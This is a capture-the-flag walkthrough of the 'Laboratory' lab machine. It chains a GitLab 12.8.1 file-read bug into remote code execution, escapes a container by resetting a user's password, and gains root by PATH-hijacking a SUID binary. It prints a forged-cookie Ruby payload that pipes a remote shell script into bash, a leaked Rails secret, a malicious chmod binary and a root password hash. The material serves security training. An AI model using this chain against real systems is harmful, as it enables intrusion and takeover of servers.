# Laboratory - Easy

Even though this is rated as an easy box it has a medium difficulty because of the number of steps you are required to but and also because even tough it has a Gitlab version that has a CVE asigned to it, we must exploit this by hand. 

### Initial nmap scan

In order to speed up the process I did two nmap scans, one with the ports: `nmap -p- -v laboratory.htb` and one with the found open ports: `nmap -sC -sV -oN nmap/all laboratory.htb -p22,80,443`. So in the end the result looks like this:

```
# Nmap 7.80 scan initiated Sat Nov 14 21:02:44 2020 as: nmap -sC -sV -oN nmap/all -p22,443,80 -v laboratory.htb
Nmap scan report for laboratory.htb (10.129.38.205)
Host is up (0.056s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/ssl Apache httpd (SSL-only mode)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Issuer: commonName=laboratory.htb
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-05T10:39:28
| Not valid after:  2024-03-03T10:39:28
| MD5:   2873 91a5 5022 f323 4b95 df98 b61a eb6c
|_SHA-1: 0875 3a7e eef6 8f50 0349 510d 9fbf abc3 c70a a1ca
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumeration on the port 443

If we try to enter on the port 80 we automaticaly get redirected to port 443, with the `http://laboratory.htb` as vhost. I've added this to my `/etc/hosts` file and started digging into the webservice. In the background I've run both nikto and ffuf for an output. On the main vhost there was nothing interesting, so I've switched to `git.laboratory.htb` which could've been found from the nmap detailed scan. 

Here we have a gitlab version in which we are actually able to register an account, but we must use an email adress with `@laboratory.htb` at the end. When we first login we can see a repository that seems to be the sourcecode of the main website. Well there is nothing inside here so I've started to wander around for GitLab cve's. And I came up with a [HackerOne report](https://hackerone.com/reports/827052) that found a LFI on Gitlab 12.8.7 and we were on 12.8.1 so it was 100% vulnerable to this. 

### Getting the foothold

In order to get the LFI was a preatty easy job to do, but if we look deep down into this article we can find that this LFI will escalate to RCE if we generate a malicious cookie. At this part I was stuck a while installing the Gitlab. So this are the steps that I've made:
- Get the secret cookie session from `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` using the LFI part
- Download the gitlab using `wget --content-disposition https://packages.gitlab.com/gitlab/gitlab-ce/packages/debian/buster/gitlab-ce_12.8.1-ce.0_amd64.deb/download.deb`
- Install it with `apt install ./gitlab-ce_12.8.1-ce.0_amd64.deb`
- Now into the `/etc/gitlab/gitlab.rb` add `gitlab_rails['secret_key_base'] = '3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3'`
- From here you must run `gitlab-ctl reconfigure`
- And now to get that ruby interactive shell you should run `gitlab-rails console`

Now what's left to do is to generate the specific cookie with the following sequence:
```ruby
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= `curl http://<ip>/shell.sh|bash` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```
And to trigger it I've run `curl -vvv 'http://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=<cookie>`

### Escape from the docker container

Well we are finally in the box... but not quite. We are on a gitlab docker container which seems to have full access over the main application. In order to do this it seemed quite obvious that I should get dexter user so.. I've tried ways to leak his password and later crack it but I've found a better article that let me reset his password using the same ruby console. Here is the oficial documentation of [Gitlab](https://docs.gitlab.com/ee/security/reset_user_password.html) regarding this.

So the sequence was:
```
user = User.where(id: 1).first
#<User id:1 @dexter>
user.password = 'laboratory.htb12
user.password_confirmation = 'laboratory.htb123'
user.save!
```

If you wonder how I've knew that dexter's id was one, well I've just guess. I knew it should've been one of the firsts users to be registered on this platform so I tried a lower id number. 

Now that I know dexter's password I head back to `git.laboratory.htb` and logged in using `dexter:laboratory.htb123`. Here we can find a private repository called `SecureDocker` which has a suggestive description `CONFIDENTIAL - Secure docker configuration for homeserver. Also some personal stuff, I'll figure that out later.` so it's a hint that we must dig deeper.

Two folders later, we get the id_rsa of dexter.... to be exact inside `securedocker/dexter/.ssh`. I've downloaded it, removed any carrage returns (`\r`) and if there was something in the end now it's 100% deleted, also I've setup the permisssions to 600 and... `ssh -i dexter_rsa dexter@laboratory.htb`. 

### Getting root

I've uploaded linpeas to my box and started an enum really fast. Amoung the SUID files I've found one called `/usr/local/bin/docker-security`. If you issue a cut on it you can see that it runs `chmod 700 /usr/bin/docker` and `chmod 660 /var/run/docker.sock`. Being an SUID file we can modify the path and upload a different chmod binary that executes `/bin/bash`.

So on my local machine I've crafted this C payload and compiled with `gcc exploit.c -o chmod`. The only thing left was to upload it on the box and update the path.
```cpp
#include <stdio.h>
#include <stdlib.h>

int main() {
  system("/bin/bash");
  return 0;
}
```

In order to update the path you can use `export PATH=/home/dexter:$PATH` and than just run `/usr/local/bin/docker-security`. 
> **Note**: The crafter chmod binary must be inside /home/dexter (or your chosen path) and it must have `/usr/bin/chmod +x chmod` setup.

Pwned. 

# Credentials
- $6$AMvgOmRCNzBloX3T$rd5nRPwkBPHenf6VLHfsXb066LNq0MZBRYeEsuCZviD8nQGvVLMaW9iH1hb5FPHzdl.McOJ8GrFIFfdSnIo4t1 (root hash)
